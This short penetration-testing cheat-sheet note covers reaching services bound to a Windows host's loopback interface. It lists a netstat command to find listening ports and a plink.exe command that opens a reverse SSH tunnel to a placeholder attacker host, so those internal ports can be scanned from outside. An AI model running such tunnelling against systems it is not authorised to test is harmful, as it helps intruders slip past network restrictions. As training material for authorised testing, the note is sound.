# Loopback Services

Search for services listening on the loopback interface:

```text
netstat -ano | findstr "LISTEN"
```

Use plink.exe to forward the loopback port to a port on our attacking host \(via SSH\):

```text
plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>
```

no we can scan the services on our own ports for vulnerabilities.

